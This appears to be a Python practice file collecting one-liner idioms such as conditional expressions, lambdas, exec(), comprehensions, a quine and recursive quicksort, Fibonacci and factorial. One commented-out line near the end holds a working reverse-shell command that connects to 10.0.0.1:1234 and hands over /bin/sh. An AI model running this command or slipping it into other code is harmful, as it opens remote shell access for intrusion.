#
ifelses = 32 if 5>7 else 78
print(ifelses)
#
ifelses = 32 if 5<7 else 78
print(ifelses)

#x if c0 else y if c1 else z
print("yes") if 5>7 else print("maybe") if 5==5 else print("no")

#
print("May be") if ifelses==32 else None

#
condi= False
condi or print("hi")

# Method 1: Single-Line Def
def f(x): return str(x*2) + '!'
print(f(3))
print(f("python"))

# Method 2: Lambda Function
f1 = lambda q: str(q*3) + " !"
print(f1(5))

# Method 3: exec()
f2= "def f3(e):\n  return str(e*8)"
exec(f2 + '\nprint(f3(2))')


for i in range(4):
    print(i)
#One Line For Loop
sqrt=[i**2 for i in range(10)]
print(sqrt)


sq=[]
for j in range(10):
    if j%2==0:
        sq.append(j**2)
print(sq)
#One Line For Loop If
sqw = [j**2 for j in range(1,20) if j%3==0]
print(sqw)

# Method 1: Single-Statement Body
#while True:
 #   print('hi')

# Method 2: Multiple-Statements Body
c = 0
while c < 10: print(c); c = c + 1


# Method 3: Nested Statements Body
#while True: print('yes') if True else print('no')
xc=0
while xc<10: print('yes') if xc%2==0 else print('no'); xc= xc+1

#
s='s=%r;print(s%%s,sep="")';print(s%s,sep="")
a='{:_<10}'.format('test')
print(a)

#Quicksort algorithm: 
unsorted = [33, 2, 3, 45, 6, 54, 33]
q= lambda a: q([x for x in a[1:] if x<=a[0]]) + [a[0]] + q([x for x in a if x>a[0]]) if a else []
print(q(unsorted))


# Original  One Line Exception Handling

try:
    print(at)
except:
    print('Exception!')
# Method 1
print(at) if 'at' in dir() else print('Exception!')
# Method 2
exec('try:print(at)\nexcept:print("Exception!")')
# Method 3
from contextlib import suppress
with suppress(NameError): print(at)

# Original  One Line Execute
x = 10
for i in range(5):
    if x%2 == 0:
        print(i)
    else:
        print(x)
    x = x - 1
print("---------------------")
# Method 1
exec('x =10\nfor i in range(10):\n    if x%2 ==0: print(i)\n    else: print(x)\n    x = x-1')

#One Line Reverse Shell
#python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

def f(x):
    if x == 1: return "sheema" 
print(f(1))

# Method 1: Recursive Fibonacci
def fib(n): return 1 if n in {0, 1} else fib(n-1) + fib(n-2)
print(fib(10))
# 89


# Method 2: Recursive Factorial
def fac(x): return 1 if x<=1 else x * fac(x-1)
print(fac(10))
# 3628800


# Method 3: Recursive Factorial with Lambda
fac = lambda n: 1 if n<=1 else n * fac(n-1)
print(fac(10))
# 3628800


# Method 4: Recursive Quicksort
unsorted = [33, 2, 3, 45, 6, 54, 33]
q = lambda l: q([x for x in l[1:] if x <= l[0]]) + [l[0]] + q([x for x in l if x > l[0]]) if l else []
print(q(unsorted))
# [2, 3, 6, 33, 33, 45, 54]